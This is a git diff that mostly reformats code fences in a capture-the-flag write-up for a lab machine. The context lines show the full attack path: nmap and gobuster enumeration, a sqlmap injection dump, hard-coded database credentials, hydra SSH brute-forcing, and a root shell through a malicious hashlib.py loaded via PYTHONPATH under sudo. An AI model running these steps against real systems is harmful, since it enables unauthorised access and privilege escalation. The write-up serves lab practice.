@@ -25,8 +25,8 @@
 
 `sudo nmap -sV -sC -T4 10.10.20.17`
 
-```
-ORT     STATE SERVICE VERSION
+```bash
+PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
 8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
 |_http-title:  Login
@@ -38,7 +38,7 @@ ORT     STATE SERVICE VERSION
 
 `gobuster dir -u http://10.10.20.17 -t 100 -r -x php,txt,html -w dir-med.txt`
 
-```
+```bash
 /login                (Status: 200) [Size: 856]
 /register             (Status: 200) [Size: 964]
 /logout               (Status: 200) [Size: 856]
@@ -68,7 +68,7 @@ I try to use some basic **SQLi** against the login form and decide to just test 
 
 `sqlmap -u http://10.10.20.17:8000/login -T users --dump --forms --crawl=2`
 
-```
+```bash
 POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
 sqlmap identified the following injection point(s) with a total of 57 HTTP(s) requests:
 ---
@@ -107,7 +107,7 @@ I test to see if we can **ssh** over as **smokey**:
 
 `ssh smokey@10.10.20.17`
 
-```
+```bash
 smokey@10.10.20.17's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 
@@ -141,25 +141,25 @@ smokey@biblioteca:~$
 
 Checking `sudo -l` shows us we don't have any permissions there:
 
-```
+```bash
 Sorry, user smokey may not run sudo on biblioteca.
 ```
 
 Which is odd because we see a **.sudo_as_admin_successful** file in his home directory:
 
-```
+```bash
 -rw-r--r-- 1 smokey smokey    0 Dec  7 00:22 .sudo_as_admin_successful
 ```
 
 Our `id` results show nothing out of the ordinary:
 
-```
+```bash
 uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
 ```
 
 Checking users on the system shows us 2 other than root:
 
-```
+```bash
 smokey:x:1000:1000:smokey:/home/smokey:/bin/bash
 hazel:x:1001:1001::/home/hazel:/bin/bash
 ```
@@ -170,7 +170,7 @@ I want to check out the files in the website directory next, but it's not locate
 
 `ls -al /var/opt/app/templates`
 
-```
+```bash
 -rw-rw-r-- 1 smokey smokey  553 Dec  7 00:46 index.html
 -rw-rw-r-- 1 smokey smokey  924 Dec  7 00:45 login.html
 -rw-rw-r-- 1 smokey smokey 1032 Dec  7 01:09 register.html
@@ -178,7 +178,7 @@ I want to check out the files in the website directory next, but it's not locate
 
 Looking through these files don't give us anything useful. Backing up one directory to **/var/opt/app** gives us a file called **app.py** and inside we find some hard coded credentials to the MySQL database:
 
-```
+```bash
 app.secret_key = '$uperS3cr3tK3y'
 
 app.config['MYSQL_HOST'] = 'localhost'
@@ -189,7 +189,7 @@ app.config['MYSQL_DB'] = 'website'
 
 `mysql -u smokey -p`
 
-```
+```bash
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 157
@@ -208,7 +208,7 @@ mysql>
 
 `show databases;`
 
-```
+```bash
 +--------------------+
 | Database           |
 +--------------------+
@@ -221,7 +221,7 @@ mysql>
 
 `show tables;`
 
-```
+```bash
 +-------------------+
 | Tables_in_website |
 +-------------------+
@@ -231,7 +231,7 @@ mysql>
 
 `select * from users;`
 
-```
+```bash
 +----+----------+----------------+-------------------+
 | id | username | password       | email             |
 +----+----------+----------------+-------------------+
@@ -253,7 +253,7 @@ I try and brute force my way into their account with **hydra**:
 
 It takes awhile, but does find it, and I should have tried it from the start:
 
-```
+```bash
 [22][ssh] host: 10.10.20.17   login: hazel   password: <REDACTED>
 ```
 
@@ -263,7 +263,7 @@ It takes awhile, but does find it, and I should have tried it from the start:
 
 `ssh hazel@10.10.20.17`
 
-```
+```bash
 hazel@10.10.20.17's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 
@@ -293,17 +293,21 @@ Last login: Sun Dec 12 04:36:05 2021 from 10.0.2.15
 hazel@biblioteca:~$
 ```
 
+<br>
+
+## Additional System Enumeration
+
 Waiting for us in the home directory is our first flag: **user.txt**:
 
 `wc -c user.txt`
 
-```
+```bash
 45 user.txt
 ```
 
 Checking `sudo -l` on hazel:
 
-```
+```bash
 Matching Defaults entries for hazel on biblioteca:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -347,7 +351,7 @@ Similiar to modifying your path to get something to load from somewhere it shoul
 
 `find / -name hashlib.py 2>/dev/null`
 
-```
+```bash
 /usr/lib/python3.8/hashlib.py
 ```
 
@@ -357,7 +361,7 @@ And then copy that over to **/tmp**:
 
 Then we can modify our new file to the following:
 
-```
+```python
 import pty
 pty.spawn("/bin/bash")
 ```
@@ -370,7 +374,7 @@ Now that we have our own malicious **hashlib.py** in the **/tmp** directory we c
 
 `sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py`
 
-```
+```bash
 root@biblioteca:/home/hazel#
 ```
 
@@ -380,7 +384,7 @@ In the **/root** directory we see a **root.txt**:
 
 `wc -c /root/root.txt`
 
-```
+```bash
 31 /root/root.txt
 ```
 
